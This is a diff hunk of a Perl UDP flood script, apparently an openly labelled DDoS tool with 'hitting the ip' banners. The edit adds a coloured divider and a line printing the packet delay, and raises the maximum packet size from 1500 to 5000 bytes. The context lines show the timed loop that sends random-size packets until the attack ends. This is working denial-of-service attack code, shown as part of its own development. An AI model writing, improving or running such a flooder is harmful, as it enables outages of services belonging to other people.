@@ -48,16 +48,17 @@ printf "[0;32m>> Made by DeriVer  \n";
 printf "[0;31m>> hitting the ip    \n";
 printf "[0;36m>> hitting the ports     \n";
 ($size ? "$size-byte" : "") . " " . ($time ? "" : "") . "\033[1;32m\033[0m\n\n";
-print "------------------------------------------- \n";
+print "[0;32m------------------------------------------- \n";
 print "-=-=-         DDoS Information        -=-=- \n";
 printf "Interpacket delay $delay msec\n" if $delay;
 printf "total IP bandwidth $bw kbps\n" if $bw;
 print "Size used : $size \n";
 print "Time used : $endtime \n";
 print "Port used : $port \n";
+print "Delay used : $delay \n";
 printf "[1;31m>> Press CTRL+C to stop the attack  \n" unless $time;
 
-die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
+die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 5000);
 $size -= 28 if $size;
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
